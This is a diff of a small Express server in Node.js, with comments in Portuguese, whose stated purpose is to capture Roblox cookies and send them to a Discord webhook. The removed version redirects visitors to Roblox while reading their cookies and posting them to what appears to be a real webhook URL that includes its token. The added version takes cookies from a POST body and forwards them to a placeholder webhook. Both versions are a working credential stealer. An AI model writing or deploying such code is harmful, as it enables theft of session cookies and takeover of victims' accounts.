@@ -1,44 +1,39 @@
 const express = require('express');
-const fetch = require('node-fetch');
 const bodyParser = require('body-parser');
+const fetch = require('node-fetch');
 
 const app = express();
 const port = 3000;
 
-app.use(bodyParser.urlencoded({ extended: false }));
+// Middleware para analisar corpos de solicitação
+app.use(bodyParser.json());
 
-// Endpoint para capturar os cookies do Roblox e enviar para o Discord
-app.get('/capture-cookies', (req, res) => {
-    // Abrir o Roblox
-    res.redirect('https://www.roblox.com/');
-
-    // Capturar os cookies
-    const cookies = req.headers.cookie;
+// Rota para capturar os cookies e enviar para o Discord
+app.post('/capture-cookies', (req, res) => {
+    const { cookies } = req.body;
 
     // Enviar os cookies para o Discord webhook
-    const data = {
-        content: "Cookies: " + cookies
-    };
-
-    fetch('https://discord.com/api/webhooks/1040678839396872322/TIl24vk7NiW4Fz3zACaKchZhtMc8ien3KjI9ha9EU1dTBeKIDH18H3Fgx3uStpAkG5Ud', {
+    fetch('https://discord.com/api/webhooks/SEU_WEBHOOK', {
         method: 'POST',
         headers: {
-            'Content-Type': 'application/json'
+            'Content-Type': 'application/json',
         },
-        body: JSON.stringify(data)
+        body: JSON.stringify({ content: cookies }),
     })
     .then(response => {
         if (!response.ok) {
-            throw new Error('Erro ao enviar mensagem para o Discord: ' + response.statusText);
+            throw new Error('Erro ao enviar cookies para o Discord');
         }
-        console.log('Mensagem enviada com sucesso para o Discord!');
+        console.log('Cookies enviados com sucesso para o Discord!');
+        res.sendStatus(200);
     })
     .catch(error => {
         console.error('Erro:', error);
+        res.status(500).send('Erro ao enviar cookies para o Discord');
     });
 });
 
 // Iniciar o servidor
 app.listen(port, () => {
-    console.log(`Servidor rodando em http://localhost:${port}`);
+    console.log(`Servidor escutando na porta ${port}`);
 });
